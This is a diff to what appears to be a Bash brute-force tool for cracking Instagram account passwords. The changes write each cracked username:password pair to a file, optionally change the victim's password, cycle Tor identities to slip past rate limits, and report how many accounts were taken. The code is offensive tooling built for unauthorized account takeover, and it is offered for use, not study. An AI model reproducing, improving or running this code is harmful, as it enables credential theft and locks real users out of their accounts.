@@ -1,5 +1,5 @@
 # !/bin/bash
-# Author 			: ./Lolz
+# Author 		: ./Lolz
 # Thanks to 		: JavaGhost - Bashid.org
 # Recode tinggal recode aja okeh, tapi cantumin source lah tolol
 # Yamaap kalau scriptnya acak"an:(
@@ -133,13 +133,15 @@ function brute_force(){
   					if [[ $true_login =~ "true" ]]; then
   						local followers=$(curl -sXGET "https://instagram.com/${user}/" -L | grep -o '<meta property="og:description" content=".*' | cut -d '"' -f4 | cut -d " " -f1)
   						echo -e " ${white}[ ${green}GOT ACCOUNT${white} ] ${red}-${white} @${user}${red}:${white}${pass} ${red}:${green} ${followers} ${white}Followers"
+  						echo "${user}:${pass}" >> account_success_crack.txt
 						if [[ $ask_change_pass == "Y" || $ask_change_pass == "y" ]]; then
 							change_password
+	  						echo "${user}:${pass}" >> account_success_crack.txt
 						fi
 						killall -HUP tor
   					elif [[ $login =~ "checkpoint_required" ]]; then
   						echo -e " ${white}[ ${cyan}CHECKPOINT${white} ] ${red}-${white} @${user}${red}:${white}${pass}"
-  						killall -HUP tor
+						killall -HUP tor
   					elif [[ $login =~ "false" ]]; then
   						echo -e " ${white}[ ${red}FAILED TO CRACK${white} ] ${red}-${white} @${user}${red}:${white}${pass}"
   						killall -HUP tor
@@ -161,4 +163,19 @@ function brute_force(){
 	wait
 )
 
-rm *.tmp*
+if [[ ! -e account_success_crack.txt ]]; then
+	echo -e "${white}\n[ ${red}!${white} ] Ups you don't get any account boy :("
+else
+	echo -e "${white}[ ${red}+${white} ] You got : $(< account_success_crack.txt wc -l) accounts instagram"
+fi
+
+echo -ne "${white}[ ${red}?${white} ] Wanna play with me again boy (y/n) : " ; read ask_again
+if [[ $ask_again == "Y" || $ask_again == "y" ]]; then
+	echo -e "${white}\n[ ${red}+${white} ] Okay good! lets try again boy XD"
+	bash brute.sh
+elif [[ $ask_again == "N" || $ask_again == "n" ]]; then
+	echo -e "${white}\n[ ${red}+${white} ] See u :)"
+	rm *.tmp*
+else
+	rm *.tmp*
+fi
